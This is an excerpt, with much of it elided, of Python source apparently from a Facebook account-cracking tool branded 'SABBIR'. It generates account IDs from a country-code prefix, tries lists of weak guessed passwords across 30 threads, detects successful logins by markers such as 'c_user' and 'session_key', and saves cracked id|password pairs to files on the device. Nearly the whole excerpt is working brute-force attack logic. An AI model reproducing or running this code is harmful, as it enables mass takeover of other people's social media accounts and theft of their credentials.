        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [SABBIR-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/SABBIR-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                ...
                                if 'y' in pcp:
                                        ...
                                        open(f'/sdcard/SABBIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [SABBIR-OK] %s | %s'%(ids,pas))
                                #cek_apk(session,coki)
                                open(f'/sdcard/SABBIR-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [SABBIR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SABBIR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def bd():
                ...
                with tred(max_workers=30) as sat:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'bangladesh','Bangladesh','i love you','iloveyou','free fire','Free Fire','123456 112211',' Sabbir',' 201818',' 202020',' 202121']
